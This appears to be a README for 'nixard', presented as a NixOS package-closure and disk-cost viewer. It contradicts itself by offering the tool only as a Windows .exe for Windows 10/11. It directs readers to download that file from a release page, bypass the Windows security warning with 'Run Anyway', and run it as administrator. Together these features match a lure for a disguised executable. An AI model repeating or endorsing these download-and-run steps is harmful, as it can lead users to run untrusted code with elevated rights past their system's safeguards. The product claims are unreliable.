# 📦 nixard - Simplify your NixOS package management tasks

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/whatsy4577/nixard/releases)

nixard provides a clear interface for your NixOS system. It helps you see what packages you have, how much space they use, and how to add them to your system files. You do not need to use the command line to see your package closures or analyze your installation costs. This tool turns complex system data into something you can read and understand.

## 📥 How to download the software

The software lives on the official project release page. You visit this page to download the latest version for your computer.

[Download nixard here](https://github.com/whatsy4577/nixard/releases)

Follow these steps to find the right file:
1. Open the link above in your web browser.
2. Look for the list of files under the Assets section.
3. Select the file ending in .exe for Windows.
4. Save the file to your desktop or downloads folder.

## ⚙️ Initial setup for Windows

You do not need to install nixard like a traditional program. It arrives as a standalone file. 

1. Find the file you just downloaded.
2. Double-click the file to open it.
3. Windows might show a security box. This happens because the app is direct and does not use a traditional installer. 
4. Click More Info if you see a warning, then click Run Anyway.
5. The window for nixard will appear on your screen.

## 🔍 Exploring package closures 

Package closures show you every component needed to run a piece of software. In many systems, this data stays hidden. nixard brings this data to the front. 

Use the main search bar to type the name of any package. The application lists every dependency linked to that package. You see exactly what installs when you choose specific software. This helps you avoid bloat and keep your system clean.

## 📊 Analyzing installation costs

Disk space matters. When you install new programs, your computer uses storage for the program and all its linked parts. Many users do not realize how much space a single application consumes. 

nixard calculates the total size of each package closure. You see a clear breakdown of the cost before you commit to an install. If you find a package that uses too much space, you know to look for a lighter alternative.

## 📝 Generating Nix declarations

NixOS users manage their systems through declarations. This is a text file that lists your desired software. Writing these files manually can be hard for beginners. 

nixard creates these declarations for you. Once you select the packages you want, click the Generate button. The application creates the code you need to add to your system configuration. You copy this code and paste it into your configuration file. This removes the risk of typos and syntax errors.

## 📋 Recommended system settings

Your computer should meet these standards for the best experience:
* Operating System: Windows 10 or Windows 11.
* Memory: At least 4 gigabytes of RAM.
* Storage: 100 megabytes of free space for the tool itself.
* Connection: An active internet connection to fetch current package lists.

## ❓ Frequently asked questions

Do I need to be a programmer to use this?
No. nixard acts as a visual map for your system data. You do not write code. You select options and copy the results.

Does this change my system files?
No. nixard only reads your current data and shows you options. It does not alter your NixOS configuration unless you specifically copy and paste its output into your configuration files. 

How do I update the software?
Check the release link occasionally. When a new version arrives, download the new file and replace the old one. 

Why is the file size small?
The application focuses on a specific task. It does not include unnecessary background services or graphical bloat. 

Is my data private?
Yes. nixard reads your local configuration data. It does not send information about your installed software to external servers.

## 🛠️ Troubleshooting common issues

If the window refuses to open, ensure you run the file as an administrator. Right-click the file and select Run as administrator from the menu.

If the search bar shows no results, check your internet connection. The application occasionally refreshes its index of available packages from the internet to ensure you see current information.

If you encounter a specific error code, check the GitHub repository issues page. Other users might have encountered the same issue and posted a solution.

## 🤝 Getting more help

The primary goal of this project is to make system management accessible. If you have feedback, please use the GitHub issues tracker. Describe what you attempted to do and what you saw on your screen. Keep your reports clear and simple so we can reproduce the issue quickly.